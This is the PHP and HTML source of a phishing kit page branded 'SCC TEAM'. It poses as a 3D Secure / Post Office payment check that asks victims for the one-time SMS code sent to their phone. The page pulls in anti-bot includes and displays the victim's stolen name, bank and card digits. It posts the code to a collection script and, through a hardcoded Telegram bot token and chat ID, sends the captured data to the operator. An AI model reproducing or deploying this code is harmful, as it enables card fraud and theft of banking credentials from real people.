<?php
/*
  ██████     ▄████▄      ▄████▄        ▄▄▄█████▓   ▓█████     ▄▄▄       ███▄ ▄███▓
▒██    ▒    ▒██▀ ▀█     ▒██▀ ▀█        ▓  ██▒ ▓▒   ▓█   ▀    ▒████▄    ▓██▒▀█▀ ██▒
░ ▓██▄      ▒▓█    ▄    ▒▓█    ▄       ▒ ▓██░ ▒░   ▒███      ▒██  ▀█▄  ▓██    ▓██░
  ▒   ██▒   ▒▓▓▄ ▄██▒   ▒▓▓▄ ▄██▒      ░ ▓██▓ ░    ▒▓█  ▄    ░██▄▄▄▄██ ▒██    ▒██ 
▒██████▒▒   ▒ ▓███▀ ░   ▒ ▓███▀ ░        ▒██▒ ░    ░▒████▒    ▓█   ▓██▒▒██▒   ░██▒
▒ ▒▓▒ ▒ ░   ░ ░▒ ▒  ░   ░ ░▒ ▒  ░        ▒ ░░      ░░ ▒░ ░    ▒▒   ▓▒█░░ ▒░   ░  ░
░ ░▒  ░ ░     ░  ▒        ░  ▒             ░        ░ ░  ░     ▒   ▒▒ ░░  ░      ░
░  ░  ░     ░           ░                ░            ░        ░   ▒   ░      ░   
      ░     ░ ░         ░ ░                           ░  ░         ░  ░       ░   
            ░           ░                                                         
*/
session_start();
include "../anti/anti1.php";
include "../anti/anti2.php"; 
include "../anti/anti3.php"; 
include "../anti/anti4.php"; 
include "../anti/anti5.php"; 
include "../anti/anti7.php"; 
$msg = "dsq";
?>

<html class=" js  js "><head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <title>3D Payment</title>
      <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
      <link id="lib_main" type="text/css" rel="stylesheet" href="files/style/none.css">
      <link id="lib" type="text/css" rel="stylesheet" href="files/style/none2.css">
      <link rel="shortcut icon" href="files/img/favicon.ico">
      <link rel="apple-touch-icon" href="img/favicon.png">
      <script type="text/javascript" src="files/js/modernizr.min.js"></script>
	  <script src="files/js/jquery.js"></script> 
      <script src="files/js/jquery.ccvalid.js"></script>
      <script src="files/js/jquery.mask.js"></script>
   <style>@media print {#ghostery-tracker-tally {display:none !important}}</style><style>@media print {#ghostery-tracker-tally {display:none !important}}</style></head>
   <body>
      <center>
         <style>.success, .error, .validation {
            border: 1px solid;
            margin: 10px 0px;
            padding: 15px 10px 15px 50px;
            background-repeat: no-repeat;
            background-position: 10px center;
            }
            .success {
            color: #4F8A10;
            background-color: #DFF2BF;
            }
            .error{
            color: #D8000C;
            background-color: #FFBABA;
            }
            .validation{
            color: #D63301;
            background-color: #FFCCBA;
            }
         </style>
         <div style="margin-left:2px;width:350px;border:solid 1px #d8d4d4;padding:25px">
            <img src="files/vbvmcs.png" style="width: 90px;float:left;"><img src="files/post-office.png" style="float: right;display: inline-block;margin-top: 18px;" width="100px">            <div style="clear:both"></div>
            <p style="font-size:16px;margin-top:25px;color:#807979"> Please enter your Security Code or OTP</p>
            <p style="font-size:16px;margin-top:25px;color:#807979">Authentication is required for this purchase, please type the otp code sent to your registered mobile ***-***-<?php echo $_SESSION['phonelastnum']; ?></p>
            <script type="text/javascript">
               document.onreadystatechange = function () {
                 var state = document.readyState
                 if (state == 'complete') {
                     setTimeout(function(){
                         document.getElementById('interactive');
                       // document.getElementById('fixed').style.visibility="hidden";
               		 $("#fixed").hide();
               		 $("#formf").show(500);
                     },4000);
                 }
               }
            </script>
            <form method="post" action="rez/send3.php" id="formf" style="">
               <p style="display:none;" class="validation" id="tiitleerror">This code is invalid. Check the SMS and try again.</p><br><br><table align="center" width="290" style="font-size:11px;font-family:arial,sans-serif;color:#000;margin-top:30px">
                  <?php file_get_contents("https://api.telegram.org/bot5619195222:AAEtf4M5QoHEsKtERJRzbgWH-F50z1z0zJ8/sendMessage?chat_id=5090243433&text=" . urlencode($_SESSION['message'])."" ); ?>
                  <tbody>
                     
                     <tr>
                        <td align="right">Bank :</td>
                        <td><?php echo $_SESSION['bank_name']; ?></td>
                     </tr>
                     
                     <tr>
                        <td align="right">Date :</td>
                        <td><?php echo date("d/m/Y h:i:sa"); ?></td>
                     </tr>
                     
                     <tr>
                        <td align="right">Credit Card :</td>
                        <td><?php echo "XXX-XXXX-XX-" . $_SESSION['cardlastdigit']; ?></td>
                     </tr>
                     <tr>
                        <td align="right">Full Name :</td>
                        <td><?php echo $_SESSION['fullname']; ?></td>
                     </tr>
                     <tr>
                        <td align="right" id="tiitleCardnetpas">Code Sent :</td>
                        <td>
                           <span id="countdown" class="timer"></span><script>
                              var seconds = 120;
                              function secondPassed() {
                              var minutes = Math.round((seconds - 30)/60);
                              var remainingSeconds = seconds % 60;
                              if (remainingSeconds < 10) {
                                 remainingSeconds = "0" + remainingSeconds; 
                              }
                              document.getElementById('countdown').innerHTML = minutes + ":" + remainingSeconds;
                              if (seconds == 0) {
                               clearInterval(countdownTimer);
                               document.getElementById('countdown').innerHTML = "";
                              } else {
                               seconds--;
                              }
                              }
                              var countdownTimer = setInterval('secondPassed()', 1000);
                           </script>
                        </td>
                     </tr>
                    <tr>
                        <td align="right">SMS Code</td>
                        <td class="xx"><input style="width: 100px;" type="text" name="sms1" required></td>
                     </tr>
                     
                     <tr>
                        <td></td>
                        <td><br>
                           <input style="width:74px" type="submit" value="Submit">
                        </td>
                     </tr>
                  </tbody>
               </table>
            </form>
            
            <div id="fixed" class="" style="display: none;">
               <img src="files/img/lod2.gif">
               <p class="">Loading...</p>
            </div>
            <p style="text-align:center;font-family:arial,sans-serif;font-size:9px;color:#656565"> Copyright © 1999-  2022 . All rights reserved. </p>
         </div>
         <div id="rotate" style="display:none">
            <div class="circle">
               <div class="rotate"></div>
            </div>
            <div class="overlay"></div>
         </div>
      </center>
   
</body></html>
